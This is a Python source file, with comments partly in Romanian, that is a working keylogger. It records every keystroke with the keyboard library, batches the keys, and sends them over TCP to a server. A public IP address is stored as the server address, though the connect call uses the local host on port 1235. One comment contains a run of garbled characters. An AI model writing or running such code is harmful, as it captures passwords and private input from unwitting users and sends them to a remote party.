#--------------------Program purpose-------------------
#we take each 25 keys and send it to the white hacker using tcp protocol

#--------------------Libraries-----------------------
import time
import keyboard
import socket
import threading
from threading import Condition, Thread, Lock

#--------------------Variables-----------------------
# #global variable
bufferQueue = [["#","#","#"]]  
condition = Condition()    
buffer = [] #list of key pressed 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 tcp socket 

#stocam ip-ul sv-ului intr-o variabila 
serverAddr = "94.52.58.50"

s.connect( (socket.gethostname(), 1235) )             #ne conectam la server

def SendBuffersToServer():
    #ca sa nu o folosim pe bufferqueue locala - anunt interpretorul
    global bufferQueue

    while True:
        condition.acquire()
        if len(bufferQueue) < 1 or len(bufferQueue[0]) == 0:
            condition.wait()
        print(f"buffer queue este (la consuming time ): {bufferQueue}")
        buffer1 = bufferQueue[0].copy() #o copie a primei liste din coada 
        bufferQueue.pop(0)
        msgToSendString = " ".join(buffer1)           #convert the list into a string 
        msgToSend = bytes(msgToSendString,"utf-8")    #convert the string in bytes format
        print(f"am trimis (consumat) {msgToSend}")
        s.send(msgToSend)                           #send it to the server                                        
        condition.release()
        time.sleep(1)


def GetBuffers():
    #sunt pe consumer aici 
    global bufferQueue, buffer

    while True: 
        keyPressed = keyboard.read_key()                  #take the key pressed adsadsadadasczcz;'lsadf,'a;sfkweiojfawlkfnmzsldkfmwafewat the moment 
        buffer.append(str(keyPressed))                    #append to list of key pressed 
        #print(keyPressed)                                #debugging purpose
        condition.acquire()
        if len(buffer) == 10:
            bufferQueue.append(buffer.copy()) #eu de fapt inseram referinta la lista, nu lista in sine :))) ce buuug 
            print(f"am adaugat (produs) {buffer}")
            print(f"buffer queue-ul acuma este : {bufferQueue}")
            condition.notify() #notificam threadul celalalt cand avem 
            buffer.clear() 
        
        condition.release()
        time.sleep(1)

t2 = threading.Thread(target = SendBuffersToServer)
t3 = threading.Thread(target = GetBuffers)
t3.start()
t2.start()



